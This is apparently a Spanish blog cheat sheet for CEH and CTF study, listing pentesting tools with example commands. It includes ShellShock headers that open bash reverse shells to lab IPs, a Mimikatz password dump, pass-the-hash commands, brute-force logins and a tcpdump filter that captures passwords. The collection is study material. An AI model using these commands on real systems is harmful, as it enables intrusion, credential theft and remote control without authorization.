---
layout: single
title: Herramientas revisadas (resumen)
excerpt: "Listado de herramientas útiles en seguridad y unos ejemplos que ayudan a aprender a usarlas"
date: 2018-02-07
classes: wide
header:
  teaser: https://hakin9.org/wp-content/uploads/2017/09/CEH.png
  teaser_home_page: true
categories:
  - Ethical Hacking
  - Utilidades
tags:
  - Pentesting
  - Web Exploiting
  - Web Penetration Testing
  - Examen
  - CEH
---

<p align="center">
<img src="https://hakin9.org/wp-content/uploads/2017/09/CEH.png">
</p>


## Preparación para examen CEH
<https://ceh.cagy.org/>

### 7z2john 
Extrae el hash de cifrado de password de un 7zip para romperlo con john
Necesita compilar esta librería <https://www.cpan.org/modules/by-module/Compress/Compress-Raw-Lzma-2.074.tar.gz>

### AirNG 
Suite que Monitorea y sirve para capturar/romper passwords de routers wifi 

### Armitage 
versión amistosa/interfaz de Metasploit  (fue retirado de kali)
 
### Arpspoof 
Suplanta el arp. Sirve para hacer Man in the middle 

### Burpsuit 
sirve para interceptar el tráfico web y modificarlo antes de procesarlo. 

  Detener una petición de get y modificar el user agent (ShellShock) 
  User-Agent:() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.23/80850 0>&1' 

 

### CACTUSTORCH 
FrameWork que permite la generación de archivos word capaces de devolver session reversa de tipo meterpreter. 

 

### Cadaver 
para conectarse a servicios webdav 

```bash
$cadaver http://<ip>/webdav 
login to the XAMPP servers WebDAV folder  
cadaver http://<REMOTE HOST>/webdav/ 
user: wampp 
pass: xampp  
upload a file to the webdav folder  
put /tmp/helloworld.txt  
browse to your uploaded file  
load URL, http://<REMOTE HOST>/webdav/helloworld.txt, in browser 
```

Desde <http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>  


### Cewl 
(Accent Keyword Extractor) extrae las palabras de una página web y genera un diccionario 
```bash
cewl <url> -d 0 -m 6 -w <nombre.dic> 
```

 

### ShellShock con curl 
```bash
curl -H "User-Agent: () { :;}; echo; <comando>" http://hello.com/cgi-bin/<cualquier ejecutable que se encuentre aquí> 
```

### CertUtil 
<https://www.hackingarticles.in/windows-for-pentester-certutil/ >

### CUPP 
crea diccionario en función de un cuestionario para perfilar. (git clone https://github.com/Mebus/cupp.git) 

### CURL 
ver detalle 

### Crunch 
Crea password para hacer diccionarios 

```bash
crunch 8 8 -t telsur%% | aircrack-ng -w - test-01.cap -e something 
crunch 8 8 0123456789 | pyrit -r msc-01.cap -i - attack_passthrough 
crunch 6 7 eghotu0134 | perl -ne 'print unless /([a-z]).*\1/' > wordlist.txt 
crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt  #genera números de celulares chilenos
```

### Dig 
Obtiene información de dns (puerto 53) para un dominio particular 
```bash
dig windcorp.thm any @10.10.78.247 
```

### Dirb 
enumera urls disponibles de un dominio, por medio de probar las carpetas más comunes. 

```bash
dirb http://<sitio>/<path>;  dirb http://192.168.1.103 -X .php 
```

### dmitry
para obtención de información 

```bash
dmitry -s -n <host> 
```

### DNSenum 
Enumera información de los servidores DNS 

### DNSMap
Obtiene información de los DNS 

### Dnsmasq
 

### Empire
Agente de post-explotación de PowerShell puro basado en comunicaciones criptográficas seguras y una arquitectura flexible. 

### Enum4linux 
Enumerador de usuarios y carpetas compatidas
<https://highon.coffee/blog/enum4linux-cheat-sheet/ >

### Ettercap 
para arpoisoning / MITM1 


### Exiftool 
extrae y modifica metadatos 

### Evil-winrm  
explota pass the hash 
```bash
sudo gem install evil-winrm 
evil-winrm -i 10.10.136.125 -H e4876a80a723612986d7609aa5ebc12b --user Administrator 
```
Crea una shell directamente en el equipo windows. 

<https://blog.spookysec.net/kerberos-abuse/ >


### fcrackzip 
para usar fuerza bruta en zips. 
```bash
fcrackzip -v -D -u -p /usr/share/dict/words secret.zip 
```
 
### Forfiles (windows) 

```bash
C:\>forfiles /P C: /S /M "*curso*" -> busca en el disco todos los archivos que contengan en el nombre curso 
```

### Fluxion 
crackear wifi 

### file
muestra características del archivo a modo de identificar su tipo. (magic number) 

 

### Find
Para encontrar archivos o cadenas de texto. 

```bash
find / -perm -u=s -type f 2>/dev/null        #sirve para encontrar ejecutables que se pueden correr como root 
find / -perm -4000 2>/dev/null               #lo mismo. 
find /home -type -f -printf "%f\t%p\t%p\t%u\r%g\t%m\n" | column -t     #para listar todos los archivos de un directorio y sus atributos. 
find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;  #para encontrar contraseñas en archivos de configuración 
find . -exec grep foo {} + #will show you output like this ./dir/file.py:from foo import bar  
find . -exec grep foo {} \; #will show you output like this from foo import bar  
find . -exec grep -l foo {} + #will show you output like this ./dir/file.py  
find . -exec grep -l foo {} \; #will show you output like this ./dir/file.py  
```
Desde <https://unix.stackexchange.com/questions/12902/how-to-run-find-exec>  

 
### FTP 
Para conectarse al puerto 21. En caso de no querer responder al ls, probar poniendo PASS, para pasar al modo passivo 

### Gpg
Encripta y desencripta PGP  (no es necesario usar openssl) 
En caso de encontrar *.pgp y private.asc 

```bash
gpg --import private.asc
```
para agregar la llave a la base de datos local. (necesitarás crackear el pass con pgp2john y " hash" 

```bash
gpg --decrypt algo.pgp
```
y poner la contraseña crackeada 
http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/ 

### Gobuster 
Para fuzzear virtualhosts o directiorios
```bash
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://jeff.thm/ -t 20
gobuster dns -d http://mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
gobuster dir -w lista.txt -u http://ruta -t 20 -x <extensiones>
```

### grep 
filtra y revisa el contenido de los archivos 

```bash
grep '\=$' #sirve para encontrar base64 dentro de archivos en CTFs 
grep -E '(192.168.0.30|192.168.0.40)' #busca ambas ip simultaneamente 
grep -w -i "^r....$" /usr/share/wordlists/rockyou.txt #palabras de 5 letras que comiencen con r 
grep -oP '".*?"'  #muestra el contenido de las comillas dobles 
grep -io "[0-9]\{1,2\}"  #busca números de uno o dos dígitos que contengan del 0 al 9. 
grep 'c:\\users\\' #para evitar el backslash trailing. Es necesario usar comilla simple y doble backslash. 
```

### Flags 

```bash
-R Does a recursive grep search for the files inside the folders(if found in the specified path for pattern search; else grep won't traverse diretory for searching the pattern you specify) 
-h If you're grepping recursively in a directory, this flag disables the prefixing of filenames in the results. 
-c This flag won't list you the pattern only list an integer value, that how many times the pattern was found in the file/folder. 
-i I prefer to use this flag most of the time, this is what specifies grep to search for the PATTERN while IGNORING the case  
-l will only list the filename instead of pattern found in it. 
-n It will list the lines with their line number in the file containing the pattern. 
-v This flag prints all the lines that are NOT containing the pattern 
-E This flag we already read above... will consider the PATTERN as a regular expression to find the matching strings.  
-e The official documentation says, it can be used to specify multiple patterns and if any string matches with the pattern(s) it will list it. 
```
Desde <https://tryhackme.com/room/linuxmodules>  

 

 

### Harness
FrameWork para creacion de payload. 
Ejemplo: 
```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.14.74/443 0>& 
```

### Hash-identifier 
Para identificar qué cifrado tiene un texto 

### Hydra, xhydra 
Logueador por fuerza bruta web. 

```bash
hydra -L <name.txt> -P <pass.txt> <ip> http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR”   
hydra -l admin -P /pass.txt <ip> -s 8081 http-post-form "/info/login.html:admin_Username=^USER^&admin_Password=^PASS^:submit=logIn_btn" -V -t 1 
```

o 
```
hydra -l admin -P <passwordlist> -e ns -V <targetip> http-get /  
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123 
Hydra -e nsr <ip> pop3 -l <user> -P <rockyou.txt> -s <port> -V 
hydra -l username -P password_file.txt -s port -f ip_address request_method /path #para pribar sobre access
```
 


 
### john 
crackea password 

```bash
john --wordlist=rockyou.txt <passfile> --pot=<dondequieroquedejelosresultados>
john file.hash
```
(para crackear el hash de un zip hecho con zip2john) se puede usar el parámetro --incremental para fuerza bruta. 

 

### Macchanger 
Cambia la mac address 


### Macof 
Para hacer MAC flooding. (en este estado el switch pasa a hacer broadcast (sale de unicast) y con wireshark se puede interceptar el contenido de la comunicación. 

```bash
macof -i <interface> -n <cantidad de veces> 
```


 

### Maltego 
Permite, a través de un dato cualquiera (cuenta de usuario, dominio, mail, etc.) encontrar información relacionada con este disponible en la web (como redes sociales, subdominios, libretas de direcciones, etc.). 

### Medusa 
Para crackear páginas con .htaccess.  

```bash
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test.php - 
```


### Metasploit 
Para explotar vulnerabilidades y escanear 


### Mimikatz 
Mimikatz junto con Windows Credential Editor son capaces de leer de la memoria para obtener las claves en texto plano. 

```bash
mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit
```
(debe ser ejecutado en una ventana con permisos de administrador) 

 
### NC o NetCat 
Conector de ssh. Sirve para hacer listeners o  conexiones a puertos específicos (ver mas detalles abajo) 

 
### Netdiscover 
Encuentra equipos prendidos en la red.. (si no se le pone parámetros, busca en todos) 

 
### Nikto 
Audita servidor en búsqueda de vulnerabilidades conocidas. 
```bash
nikto -h <IP> 
```

 
### Nmap 
Escaneador por excelencia. (ver detalles) 


### nslookup  
Para realizar osint a servers de correo 

```bash
$nslookup 
>set q=txt 
><domain>             | para ver SPF 
>selector.<domain>    | para ver DKIMz 
>_dmarc.<domain>      | para ver dmarc 
>exit 
```

### Leafpad 
Notepad en interfaz gráfica de kali 


### Ophcrack 
crackea contraseñas con rainbow table 

```bash
sudo ophcrack-cli -d /mnt/c/z/ophcrack_xp_tables -t xp_special -f hash -o dump -u 
```
 
### Perl 
Ejecuta código pl 
```bash
perl -ne 'print unless /([a-z]).*\1/' dict.txt > outfile.txt 
```
sirve para extraer de un diccionario las palabras que no repiten caracteres 

### pth-winexe 
Pass the Hash sirve para ejecutar comandos desde un linux sobre un equipo windows comprometido 

```bash
pth-winexe -U WorkGROUP/Administrator%<hashntlm> //<ipvictima> <comandodeseado>
```
(puede ser cmd.exe) 

Es necesario repertir el último hash. Ejemplo 

```bash
E_md4hash wrapper called. 
HASH PASS: Subst user supplied NTLM HASH. 
Microsoft Windows [Verstn 19.0. 14393] 
(c) 2016 Microsott Corporation. Todos Los derechos reservados. 
whoami 
s4vicorp\administrador pth-wtnexe -U s4vtcorp/Admtntstrador020ae267eY4d417tcteoet4gecbd4b33:92eae267e048417tcteeot49ecbd4b33 //192.168. let. 133 cmd 
```


### Python 
Para ejecutar .py 

```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```
 sirve para cargar consola una vez conectado por nc a un servidor. 

```bash
CTRL +Z 
stty raw -echo 
fg enter enter 
```

```bash
python -m SimpleHTTPServer 80
python3 -m http.server 8080 
```
sirve para levantar un servicio web simple con file dir. 

 

### Proxychains 
herramienta de shell que permite, en base a un archivo de configuración con listas de servidores proxy, realizar otras operaciones de red a través de estos equipos, saltando por varios de ellos, no exponiendo al equipo local ni dejando registro directo en él o los equipos objetivo 

 

### psexec.py 
sirve para levantar shell en windows desde linux, sabiendo la contraseña. 

```bash
psexec.py clk:clk123@10.10.10.1 cmd.exe 
Psexec.py -hashes :<ntlm/hash> <user>@<host>   --->pass the hash del ntlm 
```

### rpl 
Comando que permite reemplazar una cadena de texto por otra en un archivo 
```bash
rpl <original> <reemplazo> <archivo.txt>
```

### Rabin2 
```bash
rabin2 –zzz
```
Además de revisar binarios, este comando puede mostrar los strings mejor que STRINGS 

### Searchsploit 
Busca en la base de datos de ExploitDB pero descargada en Kali 

 
### SETH 
Herramienta de Ingeniería social. Además sirve para hacer Mitm particularmente a RDP 

### smbclient 
ver detalles 

### Smbget  

```bash
smbget –R smb://10.10.10.172/user$ -U 'user' 
```

### smbmap 
sirve para revisar carpetas compartidas en puerto 445. 

```bash
smbmap -u jpalma -p <pass> -d cnt -H mateo.cnt.telsur.cl -r <path_optional> 
smbmap -H 10.10.10.100 -A Groups.xml -R Replication -q 
lee el archivo groups.xml que estaba en SYSVOL /policies/{2mdsdsd}/MACHINE/Groups/ 
smbmap -H <ip> -r share  -->conecta al smb 
smbmap -H <ip> --upload <algo> <dirdest/algo> 
smbmap –H 8.8.8.8 -u 'null' 
```


### smbserver.py 
```bash
smbserver.py <nombredelrecurso> <directorioacompartir> 
```


### ss (socket statistics) 
<https://neverendingsecurity.wordpress.com/2015/04/13/ss-socket-statistics-commands-cheatsheet/>

 
### ssh 
para conectarte al puerto 22
-o StrictHostKeyChecking=no   #evita que pida confirmaciòn 
#Portforward 
```bash
ssh -L 80:172.0.0.1:80 root@victima 
```

### Steghide
programa de esteganografía 

```bash
steghide embed -ef sample.txt -cf image.jpg -sf output.jpg 
steghide extract -sf image.jpg -p <pass> 
```

### Stegsnow 

```bash
stegsnow –m secreto infile outfile 
stegsnow –C outfile 
```

 
### Shodan
herramienta que indexa en la Internet todos los equipos conectados IoT, con la descripción del tipo de equipo, servicios expuestos, versiones y demás características relevantes 
<https://www.shodan.io>

### Shodanwave 
Permite buscar cámaras ip vía shodan y crackear sus password. 

 
### Socat 
para pivotear en otra red (o para hacer port forwarding) 

```bash
cd /tmp 
wget http://10.10.14.6/socat (hay que levantar un servicio web para ofrecerlo) 
chmod +x socat 
./socat tcp-listen:<ipquequierousar>,reuseaddr,fork tcp:<ip>:<ipreal> 
```

### tcpdump
sniffer de tráfico local de red
```bash
tcpdump -i tun0 icmp 
tcpdump <portname> -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 
```

### TheHarvester 
Recopila información (ejecutar en modo sudo, dado que es necesario escribir datos en disco) 

### The LAZY script
FrameWork de tareas automatizadas en base a script, muy completo. 

### tplmap 
Descubre vulnerabilidades de LFI de java (<https://github.com/epinna/tplmap>) 

### tshark 
línea de comando de wireshark. Puede mostrar estadísticas de un .pcap 

```bash
tshark -nnr imadecoy -qz  io,phs (estadísticas de jerarquía) 
tshark -nnr imadecoy -qz ip_hosts,tree (estadísticas de tráfico) 
```

#### Metodología de revisión tshark
```bash
$tshark -r <captured.cap>         #analiza tráfico 
$tshark -r <captured.cap> -Tjson  #muestra todos los campos 
$tshark -r <captured.cap> -Tfields -e <campo> #filtra sólo por un campo ejemplo data.data 
$tshark -r <captured.cap> -Tfields -e <campo> -Y "<protocolo>" | xxd -r -p  #traduce el contenido de hex a textoplano 
```
 
### ViMdecript  
<https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py >

 
### wget 
Para descargar webpages.. Puede ser la página principal o el sitio completo. 
```bash
wget -r <url> #descarga recursiva
wget --no-check-certificate https://140.211.11.121/ # para saltarse el certificado
```
 
### Wfuzz 
para recorrer(fuzzear) urls con parámetros definidos. 

para fuzzear web 

```bash
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19 # para fuzzear login
wfuzz -c -L -t 500 --hh=27136 -w wordlist.txt -d 'username=Giovanni@password=FUZZ' http://10.10.10.153/moodle/login/index.php 
```
-c 
-L follow redirect 
-t threads 
--hh hide characters 
-w wordlist 
-d data en post 

Para fuzear subdominios 

```bash
wfuzz -w /directory.txt -H "host: FUZZ.host.com" --hc 200 --hw 356 -t 100 <ip> 
```
(si encuentras, para luego verlos, hay que agregarlos al archivo /etc/hosts )  

### WinRM 
<https://www.hackingarticles.in/winrm-penetration-testing/ >

### wmic
ejecuta ordenes al sistema windows. (para windows) 

```bash
wmic volume get driveletter, label | findstr "CLK" 
```
identifica en qué unidad está la USB 

```bash
for /f %d in ('wmic volume get driveletter^, label ^| findstr "CLK"') do set duck=%d 
```

### wireshark 
sniffer de red 
 
### vp 
escaneador de servidores wordpress 


### wpscan 
Escaneador de vulnerabilidades de wordpress y logueador de fuerza bruta o diccionario
```bash
wpscan --url <ip/path> --enumerate vp
wpscan --url www.test.local --wordlist pwd_dict.txt --username admin 
```
<https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/ >


### wapiti
Analisis de vulnerabilidades web (<http://wapiti.sourceforge.net/>) 

### Xfreerdp
```bash
xfreerdp /u:fela /d:corp /p:"rubenF124" /v:10.10.164.123 /cert-ignore /f 
```
/f fullscreen. Se desconecta con ctrl+alt+enter 

### xsltproc 
transforma un export de nmap en un reporte amistoso 
```bash
xsltproc archivo.xml >archivo.html 
```

### xxd 
muestra el contenido hexadecimal del un archivo 

```bash
xxd -r <file> #reversa desd eun hexa a binario
```

### yersinia 
FrameWork para ataques a la capa 2, genera starvation del dhcp 

### Zip2john 
genera hash de un zip para luego poder crackearlo con john
```bash
zip2john test.zip > zip.hashes 
```

